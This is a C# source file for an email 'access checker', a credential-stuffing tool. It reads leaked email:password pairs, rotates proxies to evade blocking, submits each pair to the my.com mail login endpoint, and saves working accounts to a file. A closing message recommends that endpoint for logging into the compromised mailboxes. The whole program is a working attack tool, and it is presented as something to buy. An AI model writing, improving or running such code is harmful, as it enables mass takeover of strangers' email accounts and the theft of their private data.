using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Leaf.xNet;
using System.Drawing;
using MailAccess_Checker.Utils;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace MailAccess_Checker
{
  internal class Program
  {
    static string appName = "buy aeris.wtf";
    static string appVersion = "1.0.0";
    static string altsPath = "alts.txt";
    static string proxiesPath = "proxies.txt";
    public static int hits, bads = 0;
    public static string[] combo, proxy, test;
    public static List<string> hitsSaved = new List<string>();
    public static bool debug = false;

    public static void Main(string[] args)
    {
      Console.Title = appName;
      
      // Check if alts.txt exists
      if (!File.Exists(altsPath) || new FileInfo(altsPath).Length == 0)
      {
        Logger.Warning("Couldn't find " + altsPath + "!");
        return;
      }
      else
        Logger.Info(altsPath + " has been found.");

      // Check if proxies.txt exists
      if (!File.Exists(proxiesPath) || new FileInfo(proxiesPath).Length == 0)
      {
        Logger.Warning("Couldn't find " + proxiesPath + "!");
        return;
      }
      else
        Logger.Info(proxiesPath + " has been found.");
      
      combo = File.ReadAllText(altsPath).Split(new[] {Environment.NewLine}, StringSplitOptions.None);
      proxy = File.ReadAllText(proxiesPath).Split(new[] {Environment.NewLine}, StringSplitOptions.None);

      // Select proxy type
      Logger.Question("Proxies type (Socks4, Socks4a, HTTP, HTTPs): ");
      string proxyType = Console.ReadLine();

      // ----------------------------------------------------------------//
      
      Console.Clear();
      Logger.Info("Starting checker!");
      
      // Loop the code for X number times (x = number of lines of alts.txt)
      for (int i = 0; i < combo.Length; i++)
      {
        try
        {
          Console.Title = appName + " ~ Loaded: " + combo.Length + "~ Left: " + (combo.Length - bads) + " - Hits: " + hits + " - Bads: " + bads;

          // Split the account
          string[] rawAccount = combo.ElementAt<String>(i).Split(':');
          // Get the proxy
          string proxies = proxy.ElementAt<String>(new Random().Next(proxy.Length));
          // Get the account email/username
          string username = rawAccount[0];
          // Get the account password
          string password = rawAccount[1];

          using (HttpRequest httpRequest = new HttpRequest())
          {
            // Proxy
            if (proxyType.Contains("Socks4"))
              httpRequest.Proxy = Socks4ProxyClient.Parse(proxies);
            else if (proxyType.Contains("Socks4a"))
              httpRequest.Proxy = Socks4AProxyClient.Parse(proxies);
            else if (proxyType.Contains("Socks5"))
              httpRequest.Proxy = Socks5ProxyClient.Parse(proxies);
            else if (proxyType.Contains("HTTP") || proxyType.Contains("https"))
              httpRequest.Proxy = HttpProxyClient.Parse(proxies);
            
            // Request stuff
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.ConnectTimeout = 50 * 1000;
            httpRequest.AllowAutoRedirect = true;
            httpRequest.KeepAlive = true;

            string request = httpRequest.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + username + "&Password=" + password).ToString();
            
            Logger.Debug(request);

            if (request.Contains("Ok=1"))
            {
              Logger.Hit(username + ":" + password);
              hitsSaved.Add(username + ":" + password);
            }
            else
            {
              bads++;
            }
          }
        }
        catch (Exception e)
        {
          Console.WriteLine(e.ToString());
        }
      }
      
      // Print ending informations
      Logger.Info("Checker has ended!");

      Console.Write("[ \u2713 ] ", Color.HotPink);
      Console.Write("Hits: ", Color.Gray);
      Console.WriteLine($"{hits}", Color.HotPink);

      Console.Write("[ X ] ", Color.HotPink);
      Console.Write("Bads: ", Color.Gray);
      Console.WriteLine($"{hits}", Color.HotPink);

      string date = String.Format("{1}_{0:yyyy-MM-dd-HH-mm-ss}", DateTime.Now, "results");
      TextWriter tw = new StreamWriter(date + ".txt");
      foreach (String s in hitsSaved)
        tw.WriteLine(s);
      tw.Close();

      Logger.Info("Saved the hits to " + date + ".txt!");
      Logger.Info("We recommend using 'aj-https.my.com' to login on emails. (Goodluck using it)");
      Console.ReadLine();
    }
  }
}